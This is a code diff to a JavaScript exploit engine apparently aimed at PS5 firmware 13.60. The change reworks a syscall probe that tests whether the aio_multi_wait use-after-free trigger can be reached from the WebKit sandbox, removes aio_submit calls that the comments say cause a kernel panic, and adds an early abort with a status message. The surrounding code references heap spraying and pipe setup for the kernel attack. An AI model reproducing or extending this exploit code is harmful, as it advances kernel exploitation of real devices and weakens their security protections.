@@ -297,54 +297,49 @@ export function makeBagagwaEngine(X) {
         return { ok: !r.failed, ret: r.s32 };
     }
 
-    // Upstream v10-style safe layout probe (dummy data only, never fails
-    // the stage): EPERM/EINVAL/ESRCH = reachable layout, ENOMEM = pointer
-    // in count slot (huge alloc), hang = blocking layout. The errno map
-    // tells us the true 13.60 signature empirically.
+    // Probes ONLY aio_multi_wait arg layouts (never aio_submit — it panics
+    // without aio_init). Returns { multiWaitEperm: bool } so the caller can
+    // abort early rather than wasting pipe+spray memory on a blocked path.
     async function probeAioLayouts() {
-        note("[PROBE] arg-layout probe (dummy data, safe)...");
-        // Sanity first: pipe2 takes a pointer arg and is known-safe. If
-        // THIS kills the tab, pointer-arg syscalls are broken in general
-        // (not AIO-specific). If it passes, only AIO kills.
-        const pb = safeAlloc(8, "probe-pipe");
-        if (!pb) { note("[PROBE] skipped (OOM)"); return; }
-        w32(pb.u8, 0, 0); w32(pb.u8, 4, 0);
-        try {
-            note("[PROBE] trying pipe2(ptr,0)...");
-            const pr = await sys(SYS_PIPE2, pb.base, 0);
-            note("[PROBE] pipe2 -> ret=" + pr.s32 + " err=" + pr.errText);
-            if (!pr.failed) {
-                const a = r32(pb.u8, 0) | 0, b = r32(pb.u8, 4) | 0;
-                await sys(SYS_CLOSE, a); await sys(SYS_CLOSE, b);
-                note("[PROBE] pipe2 fds closed — pointer-arg syscalls WORK");
-            }
-        } catch (e) {
-            note("[PROBE] pipe2 threw: " + (e && e.message ? e.message : e));
-        }
-        const zs = safeAlloc(0x40, "probe-zero-struct");
+        note("[PROBE] safe arg-layout probe (multi_wait only — submit omitted, panics without init)...");
         const ids = safeAlloc(8, "probe-dummy-ids");
-        if (!zs || !ids) { note("[PROBE] AIO cases skipped (OOM)"); return; }
-        for (let i = 0; i < 0x40; i++) zs.u8[i] = 0;
+        if (!ids) { note("[PROBE] skipped (OOM)"); return { multiWaitEperm: true }; }
         w32(ids.u8, 0, 0); w32(ids.u8, 4, 1);
-        // wait-cases first: submit is already proven lethal on 13.60
-        // WebKit, so ask multi_wait (the UAF syscall itself) before dying.
-        const cases = [
+
+        // Only probe aio_multi_wait — the UAF syscall itself.
+        // DO NOT probe aio_submit here: without aio_init the kernel has no
+        // AIO context → null-ptr deref → kernel panic → PS5 shows
+        // "not enough free memory". Confirmed on 13.60 WebKit.
+        let multiWaitEperm = false;
+        const waitCases = [
             ["wait(ids,2,0,0)", SYS_AIO_MULTI_WAIT, [ids.base, 2, 0, 0]],
             ["wait(0,ids,2,0)", SYS_AIO_MULTI_WAIT, [0, ids.base, 2, 0]],
-            ["submit(1,ptr)", SYS_AIO_SUBMIT, [1, zs.base]],
-            ["submit(ptr,1)", SYS_AIO_SUBMIT, [zs.base, 1]],
         ];
-        for (const [label, num, args] of cases) {
-            if (P.syscalls[num] === undefined) { note("[PROBE] " + label + ": no stub"); continue; }
+        for (const [label, num, args] of waitCases) {
+            if (P.syscalls[num] === undefined) {
+                note("[PROBE] " + label + ": no stub");
+                multiWaitEperm = true;
+                continue;
+            }
             try {
                 note("[PROBE] trying " + label + "...");
                 const r = await sys.apply(null, [num].concat(args));
-                note("[PROBE] " + label + " -> ret=" + r.s32 + " err=" + r.errText);
+                note("[PROBE] " + label + " → ret=" + r.s32 + " err=" + r.errText);
+                if (r.errText === "EPERM") multiWaitEperm = true;
             } catch (e) {
                 note("[PROBE] " + label + " threw: " + (e && e.message ? e.message : e));
+                multiWaitEperm = true;
             }
         }
-        note("[PROBE] done — EPERM/EINVAL=safe layout, ENOMEM=pointer-as-count, hang=blocking");
+        if (multiWaitEperm) {
+            note("[PROBE] RESULT: aio_multi_wait EPERM both layouts");
+            note("[PROBE] This confirms: WebKit sandbox on 13.60 blocks the UAF trigger syscall.");
+            note("[PROBE] bagagwa AIO path is fully sandboxed — need non-AIO kernel path.");
+        } else {
+            note("[PROBE] RESULT: aio_multi_wait reachable — UAF trigger may work!");
+        }
+        note("[PROBE] done.");
+        return { multiWaitEperm };
     }
 
     async function sprayOsem(count, batchSize) {
@@ -777,7 +772,26 @@ export function makeBagagwaEngine(X) {
         }
         // ── END AIO INIT ─────────────────────────────────────────────────────────
 
-        try { await probeAioLayouts(); } catch (_) {}
+        // Run probe — if aio_multi_wait is EPERM, the UAF trigger is blocked.
+        // Stop HERE before touching pipes or spray memory: saves ~4MB of WebKit
+        // arena that would otherwise OOM the page on the next P.malloc call.
+        let probeResult = { multiWaitEperm: false };
+        try { probeResult = await probeAioLayouts(); } catch (_) {}
+
+        if (probeResult.multiWaitEperm) {
+            out.why = [
+                "aio_multi_wait EPERM on PS5 13.60 WebKit sandbox.",
+                "The UAF trigger (aio_multi_wait mode=0) and init (aio_init) are both",
+                "blocked by kernel policy from the WebKit renderer process.",
+                "bagagwa requires AIO syscalls that this sandbox does not allow.",
+                "\nStatus: WebKit userland = DONE. Kernel = needs non-AIO path.",
+                "The scene is working on a 13.60-compatible kernel exploit.",
+                "Watch OzRviju/bagagwa-exploit and PS5 R&D Discord for updates."
+            ].join(" ");
+            note("STAGE 0 BLOCKED: " + out.why);
+            return out;
+        }
+
         note("[S0-1] pipe (empty — reads must block)");
         const pipeBuf = safeAlloc(8, "uaf-pipe");
         if (!pipeBuf) { out.why = "uaf-pipe buffer OOM (arena exhausted)"; return out; }
